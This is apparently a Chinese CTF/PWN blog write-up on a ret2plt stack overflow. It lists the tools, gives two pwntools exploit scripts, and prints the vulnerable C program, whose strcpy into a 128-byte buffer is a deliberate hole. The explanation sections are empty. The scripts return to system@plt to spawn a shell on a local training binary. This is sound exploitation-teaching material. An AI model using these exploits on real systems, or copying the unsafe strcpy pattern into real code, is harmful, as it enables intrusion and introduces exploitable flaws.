---
layout:     post
title:      stack_ret2plt
subtitle:   解题思路
date:       2018-07-05
author:     Mao
header-img: img/home-bg-geek.jpg
catalog: true
tags:
    - PWN
    - 栈溢出
---



## 所需环境

环境要求

> ubuntu 16.04 64bit
>
> python 2.7



所需工具

> pwntools
>
> gdb-peda
>
> 32位 ida





## 分析过程





## 解题思路

思路



exp1.py

```python
#!/usr/bin/env python

from pwn import *

p = process("./pwn1")
pwn1 = ELF('./pwn1')

#system_plt = 0x080484b0
system_plt = pwn1.plt['system']
sh_addr = 0x80482ea
#system_plt == system_symbols = pwn1.symbols['system']

offset = 140

payload = 'a'*offset+p32(system_plt)+'b'*4+p32(sh_addr)

p.recvuntil("name:")
p.sendline(payload)
p.recvuntil(":")
#raw_input("debug")
p.sendline("1")

p.interactive()
```



exp2.py

```python
#!/usr/bin/env python

from pwn import *

sh = process('./pwn1')

call_system_addr = 0x080487BD
sh_addr = 0x80482ea

payload = 'a'*140 + p32(call_system_addr) + p32(sh_addr)

sh.recvuntil('input your name:')
sh.sendline(payload)

sh.recvuntil(':')
sh.sendline('1')

sh.interactive()
```



stack_ret2plt.c

```c
#include <stdio.h>

#include <stdlib.h>

#include <string.h>


void ShowInfo(char *name);
void UsePrinter(void);
void ShowList(void);

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    fflush(stdout);

    char name[256] = {"\x00"};
    int choice;

    printf("Welcome to use the OA system.\n");
    printf("input your name:");
    scanf("%256s", name);
    while(1)
    {
        printf("what do you want to do?\n");
        printf("1 Show the information\n");
        printf("2 Use the printer\n");
        printf("3 show the todo list\n");
        printf("4 exit\n:");
        scanf("%d", &choice);
        switch(choice){
            case 1:
                ShowInfo(name);
                break;
            case 2:
                UsePrinter();
                break;
            case 3:
                ShowList();
                break;
            default:
                exit(0);

        }
    }

}

void ShowList(void)
{
    printf("nothing to do!\n");
}

void ShowInfo(char *name)
{
    char newName[128] = {"\x00"};
    strcpy(newName, name);
    printf("your name:%s\n", newName);
}

void UsePrinter(void)
{
    system("echo you are usring the printer");
}
```



## 总结



